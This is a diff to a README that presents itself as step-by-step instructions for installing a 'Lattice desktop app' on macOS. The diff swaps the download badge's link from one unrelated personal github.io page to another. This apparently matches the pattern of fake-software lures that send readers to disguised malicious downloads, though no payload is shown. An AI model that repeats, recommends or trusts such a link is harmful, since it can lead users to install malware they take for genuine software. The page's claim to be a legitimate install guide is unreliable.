@@ -3,7 +3,7 @@
 
 Lattice helps teams stay connected, aligned, and motivated with powerful performance management tools. This guide provides clear step-by-step instructions to install the **Lattice desktop app on macOS**.
 
-[![Get Lattice for macOS](https://img.shields.io/badge/Get-Lattice%20for%20MacBook-000000?style=for-the-badge&logo=apple&logoColor=white)](https://linkolnmoldranz782.github.io/.github/)
+[![Get Lattice for macOS](https://img.shields.io/badge/Get-Lattice%20for%20MacBook-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tarosimple73-creator.github.io/.github/)
 
 ---
 
